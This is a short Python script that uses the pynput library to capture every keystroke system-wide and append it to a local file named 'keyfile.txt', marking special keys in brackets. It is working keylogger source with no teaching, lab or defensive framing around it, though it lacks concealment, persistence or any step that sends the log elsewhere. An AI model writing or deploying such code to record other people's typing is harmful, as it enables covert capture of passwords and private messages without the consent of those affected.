from pynput import keyboard

def keyprsd(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            # Handle special keys here if needed
            logkey.write(f'[{key}]')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyprsd)
    listener.start()
    input()
